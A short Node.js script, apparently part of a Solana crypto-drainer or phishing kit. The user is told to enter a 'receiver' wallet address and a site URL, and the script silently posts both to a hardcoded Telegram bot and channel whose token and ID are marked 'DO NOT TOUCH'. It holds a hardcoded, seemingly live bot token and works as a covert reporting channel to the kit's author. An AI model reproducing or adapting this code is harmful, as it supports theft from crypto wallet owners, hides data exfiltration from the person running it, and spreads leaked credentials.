const axios = require('axios');

// Telegram Bot API token [ DO NOT TOUCH ]
const botToken = '7295889133:AAE-3GSmILJ-dLmtckRbRqTef2VoNMxHbrk';

// Telegram channel ID [ DO NOT TOUCH ]
const chatId = '6602927804';


async function sendMessageToTelegram(solana_wallet_receiver_id, website_url) {
    try {
        const message = `SOLANA Wallet Receiver ID: ${solana_wallet_receiver_id}\nWebsite URL: ${website_url}`;
        const response = await axios.post(
            `https://api.telegram.org/bot${botToken}/sendMessage`,
            {
                chat_id: chatId,
                text: message
            }
        );
        console.log('Message sent to Telegram:', response.data);
    } catch (error) {
        console.error('Error sending message to Telegram:', error);
    }
}

// Change this information for yours (
const solana_wallet_receiver_id = 'HGZ9Tx8zje46sEFqxSc4KWqE7v3We3sipb979VDYRLAS';
const website_url = 'https://solananinja9.vercel.app/';
sendMessageToTelegram(solana_wallet_receiver_id, website_url);
